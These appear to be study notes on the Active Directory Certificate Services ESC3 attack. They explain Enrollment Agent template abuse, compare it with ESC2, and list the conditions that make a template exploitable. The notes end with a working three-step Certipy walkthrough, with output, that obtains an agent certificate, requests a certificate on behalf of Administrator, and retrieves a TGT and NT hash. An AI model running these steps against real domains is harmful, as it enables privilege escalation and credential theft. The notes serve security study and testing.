Its same as `ESC2` but the difference is ESC2 has `AnyPurpos` EKU which mean it has has implicitly the OID of Enrollment Agent EKU. So ESC3 has less EKU but has the same attack path as ESC2.

ESC3 , is to abuse Misconfigured `Enrollment Agent Templates `, which bears similarities to ESC1 and ESC2 . However, it involves exploiting a different Extended Key Usage (EKU) and necessitates an additional step to carry out the abuse.

# Understand 
## 🎭 Normal certificate issuance

- Normally, **you request your own cert**:
    - You → generate keypair + CSR → CA → cert for _you_.
- The CA issues a cert **bound to your identity** because you authenticated to AD and were authorized via the template.
So far so good. ✅

---
## 🕵️ ESC3: Enrollment Agent

- Sometimes, an IT admin (helpdesk, smart card provisioning team, etc.) needs to **request a cert for another user**.    
    - Example: Alice the helpdesk tech requests a SmartCard Logon cert for Bob, who’s standing in front of her.
- To do this, Alice needs a special cert called an `Enrollment Agent` cert.
    - This cert has the EKU **Certificate Request Agent** (`1.3.6.1.4.1.311.20.2.1`).
    - That EKU allows Alice to co-sign a CSR _on behalf of Bob_.
- The CA sees:
    - “Request came from Alice”
    - “But the Enrollment Agent cert says she’s allowed to request _on behalf of_ Bob”
    - → Issues Bob a cert.
---

## 🚨 Where’s the problem?

The problem is **who is allowed to be an Enrollment Agent**.

- If **any low-privileged user** (like `Domain Users`) can enroll in the Enrollment Agent template…
- Then that user can request **Enrollment Agent certs**.
- And with those certs, they can request _any kind of cert_ for _any other user_, including:
    - A **SmartCard Logon cert** for a Domain Admin.
    - A **Client Authentication cert** for another user.
- That means:
    - Attacker gets an Enrollment Agent cert.
    - Attacker generates a CSR “on behalf of Administrator”.
    - CA happily issues a cert for Administrator.
    - Attacker can now authenticate to AD as Administrator, **without knowing the admin’s password**.
Game over 🏴‍☠️.

---
## 🔄 Where does the cert go?

When Alice (the helpdesk tech) uses her **Enrollment Agent** cert to request a cert _on behalf of Bob_:

- The **issued cert belongs to Bob** (subject = Bob, UPN = Bob, etc.).
- But the CA doesn’t “send it to Bob automatically.” It gives it back to **Alice’s requesting process**.
- Alice is then responsible for **delivering it securely to Bob’s device** (e.g., installing it on Bob’s smart card).

👉 This is why the risk is so big: whoever makes the request **receives the cert + private key** first.  
If that “whoever” is a malicious attacker, they can just keep the cert for themselves and impersonate Bob.

So: **Alice requests for Bob → cert comes back to Alice → Alice gives it to Bob (if she’s legit)**.

---
# ESC2 vs ESC3
## 🔹 **ESC2: Dangerous `ENROLLEE_SUPPLIES_SUBJECT`**

- Some templates are configured so that **the requester can choose the Subject / SAN** (Subject Alternative Name) of the certificate.
- That means:
    - I, `User1`, send a CSR saying _“Issue me a cert for `Administrator@domain.com`”_.
    - If the template allows me to supply SAN and has an EKU like **Client Authentication** or **Smartcard Logon**, the CA issues a cert that AD treats as if it belongs to **Administrator**.
- **Problem**: the CA **trusts whatever SAN I put in the request**.
- No enrollment agent cert is needed — I just abuse a sloppy template.

👉 **Attack summary:** I request **directly** a cert for another identity by lying in the SAN field.

---

## 🔹 **ESC3: Enrollment Agent abuse**

- Here, the template allows me to request an **Enrollment Agent cert** (with EKU `Certificate Request Agent` = `1.3.6.1.4.1.311.20.2.1`).    
- With that cert, I can generate CSRs **on behalf of others** and co-sign them.
- The CA, when seeing that CSR + my agent cert, says: _“Okay, User1 is acting as Enrollment Agent, and they’re requesting a cert for Administrator — valid.”_
- So I get back a cert that really belongs to Administrator.

👉 **Attack summary:** I first get an **Enrollment Agent cert**, then use it to request certs for _anyone else_.

---

## 🔑 Core difference

- **ESC2** = Abuse of a template that lets me **supply arbitrary Subject/SAN**. (Direct impersonation via misconfig.)    
- **ESC3** = Abuse of an **Enrollment Agent cert** that lets me **legitimately request on behalf of others**. (Delegation misused.)

Think of it this way:
- ESC2 = “The CA let me lie on the form.”
- ESC3 = “The CA gave me power-of-attorney for everyone, and I abused it.”

---
# ESC3 Abuse Requirements
To abuse this for privilege escalation, a CA requires at least two templates matching the conditions below:

Condition 1 - Involves a template that grants low-privileged users the ability to obtain an `enrollment agent certificate` . This condition is characterized by several specific details, which are consistent with those outlined in ESC1 :
1. The Enterprise CA grants low-privileged users enrollment rights (same as ESC1 ).
2. Manager approval should be turned off (same as ESC1 ).
3. No authorized signatures are required (same as ESC1 ).
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates (same as ESC1 ).
5. The certificate template includes the Certificate Request Agent EKU , specifically the Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1), allowing the requesting of other certificate templates on behalf of other principals.

Condition 2 - Another template that permits low-privileged users to use the enrollment agent certificate to request certificates on behalf of other users. Additionally, this template defines an Extended Key Usage that allows for domain authentication. The conditions are as follows:
1. The Enterprise CA grants low-privileged users enrollment rights (same as ESC1 ).
2. Manager approval should be turned off (same as ESC1 ).
3. The template schema version 1 or is greater than 2 and specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
4. The certificate template defines an EKU that enables domain authentication.
5. No restrictions on enrollment agents are implemented at the CA level.

## Exploitation with Certipy
The exploitation process involves obtaining an Enrollment Agent certificate and then using it to request a certificate for a privileged user, which is then used for authentication.


**Step 1: Obtain an Enrollment Agent certificate.** The attacker (`attacker@corp.local`) enrolls for a certificate from the misconfigured `EnrollAgent` template (or an ESC2 "Any Purpose" template).
```
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'EnrollAgent'

Certipy v5.0.0 - by Oliver Lyak (ly4k)
[*] Requesting certificate via RPC
[*] Request ID is 1
[*] Successfully requested certificate
[*] Got certificate with UPN 'attacker@CORP.LOCAL'
[*] Certificate object SID is 'S-1-5-21-...-1106'
[*] Saving certificate and private key to 'attacker.pfx'
[*] Wrote certificate and private key to 'attacker.pfx'

```

This command requests a certificate for `attacker@corp.local` using the `EnrollAgent` template. The output `.pfx` file (`attacker.pfx` in this case) will contain the Enrollment Agent certificate.


**Step 2: Use the Enrollment Agent certificate to request a certificate on behalf of the target user.** The attacker uses their `attacker.pfx` (their agent certificate obtained in Step 1) to request a certificate from the `User` template (or another suitable agent-enrollable target template) on behalf of `CORP\Administrator`.
```
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'

Certipy v5.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 2
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@CORP.LOCAL'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```
- `-template 'User'`: The target template that allows agent enrollment and issues authentication certificates.
- `-pfx 'attacker.pfx'`: Specifies the attacker's own certificate, which will be used as the enrollment agent certificate to sign the "on-behalf-of" request.
- `-on-behalf-of 'CORP\Administrator'`: Specifies the target user for whom the new certificate is being requested. This parameter requires the `<DOMAIN_NETBIOS_NAME>\<SAM_ACCOUNT_NAME>` format for the user.
This creates `administrator.pfx`, a certificate valid for the `Administrator` account, but now possessed by the attacker.


**Step 3: Authenticate using the "on-behalf-of" certificate.** The attacker uses the `administrator.pfx` (obtained in Step 2) to authenticate as the Administrator.
```
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'

Certipy v5.0.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@CORP.LOCAL'
[*]     Security Extension SID: 'S-1-5-21-...-500'
[*] Using principal: 'administrator@corp.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
```